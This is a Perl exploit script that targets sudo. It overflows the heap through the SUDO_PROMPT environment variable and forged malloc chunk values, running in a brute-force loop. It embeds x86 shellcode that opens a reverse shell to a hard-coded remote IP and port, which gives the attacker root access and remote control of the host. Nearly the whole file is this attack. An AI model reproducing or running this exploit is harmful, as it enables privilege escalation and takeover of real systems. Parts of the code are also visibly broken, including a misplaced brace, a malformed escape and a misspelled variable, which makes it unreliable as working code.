#!/usr/bin/perl

$username = "alex";
$shellcode = "\x90\x90\x90\x90\x90\x90\x90\x90".
"\x31\xdb\x43\x6a\x06\x53\x6a\x02\x89\xe1\x6a\x66\x58\xcd\x80\x89".
"\xc6\x99\x52\x89\xe0\xc6\x40\x01\x14\x58\x43\x52\x66\x50\x66\x53".
"\x89\xe0\x6a\x10\x50\x56\x89\xe1\x6a\x66\x58\xcd\x80\x68".
"\xd8\x17\xbc\x2d". # remote ip
"\x66\x68".
"\xff\xfe". # remote port
"\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\x6a\x66\x58\xcd\x80".
"\x99\x89\xd1\x89\xf3\x6a\x3f\x58\xcd\x80\x41\x89\xc3\x6a\x3f\x58".
"\xcd\x80\x41\x89\xc3\x6a\x3f\x58\xcd\x80\x52\x68\x6e\x2f\x73\x68".
"\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x6a\x0b\x58\xcd\x80";

for ($cmd_arg_sz = 16392-5*256; $cmd_arg_sz <16392+5*256; $cmd_arg_sz+=8)
{
  $prompt_sz = 16384;

# sudo_argv()

  $i = 0;
  $varg[$i] = "/usr/bin/sudo "; # arg1
  $varg[$i++] = "/chocolate/starfishstiqz/and/the/hot/dog/flavored/water"; #arg2

  $varg_sz = $cmd_arg_sz - length($varg[1]) - 4;
  $varg[$i] .= " ";

  for ($i++; $i <= (($varg_sz - 4)%16); $i++){
    $varg[$i] = "\x41"; # dummy charz }

  $varg[$i] .= " "

  # fillin malloc chunk
  $varg[$i++] = "\x0d\xef\xac\xed";
  $varg[$i++] = -4 - 0x10000;
  $varg[$i++] = 0x0805d1ac - 24;
  $varg[$i++] = 0x08050000 + 0x10000 - 3;

  $varg[$i++] = "\x41\x41\x41\x0a";

# sudo_envp()

  $i = 0;
  $sh[$i] = "SHELL=";

  for ($k = 0; $k < 0x10000/4; $k += 4){
    $sh[$i] .= "\x90\x\x90\xeb\x08";
  }

  $sh[$i++] = $shellcode;
  # end of $SHELL

  $i = 0;
  $esc_specify = "u";
  $esc_sz = length($username);
  $prompt_padding = $promt_sz - 4 - 2*$esc_sz;

  $prompt[$i++] = "SUDO_PROMPT=";
  $prompt[$i++] = $esc_specify."%".$esc_specify;

  for ($k = 0; $k < (22 - $prompt_padding%22); $k++){
    $prompt[$i++] = "Please type Control-D.. ";
  }

  for ($k = 0; $k < ($prompt_padding/22); $k++){
    $prompt[$i++] = "Please type Control-D.. ";
  }

  $prompt[$i++] = "%";

  # end of $SUDO_PROMPT

  system($varg);

} # end of brute-l00p
